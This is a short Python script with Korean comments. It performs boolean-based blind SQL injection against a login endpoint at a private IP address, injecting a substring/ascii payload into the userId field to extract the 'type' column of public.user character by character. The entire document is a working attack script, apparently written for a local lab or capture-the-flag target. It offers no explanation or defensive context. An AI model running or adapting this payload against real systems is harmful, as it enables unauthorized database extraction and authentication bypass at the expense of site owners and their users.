import requests


for i in range(0,7):
    result = ""
    s = ""
    for j in range(1,9):
        for k in range(96,124):
            id = f"'or ascii(substring((select type from public.user OFFSET {i} LIMIT 1),{j},1))={k}--"
            # 서버 주소와 포트에 맞게 수정
            url = 'http://192.168.64.1:1204/users/signin'
            data = {
                'userId': id,
                'password': 'hello1'
            }

            try:
                response = requests.post(url, json=data)
                if('success' in response.text):
                    #print(chr(k))
                    result += chr(k)
                    break
                else:
                    if(k==123):
                        s="!"

            except Exception as e:
                print('요청 중 오류 발생:', e)

        if(s=="!"):
            break
    print("type ",i+1,"번째 값 : "+result)
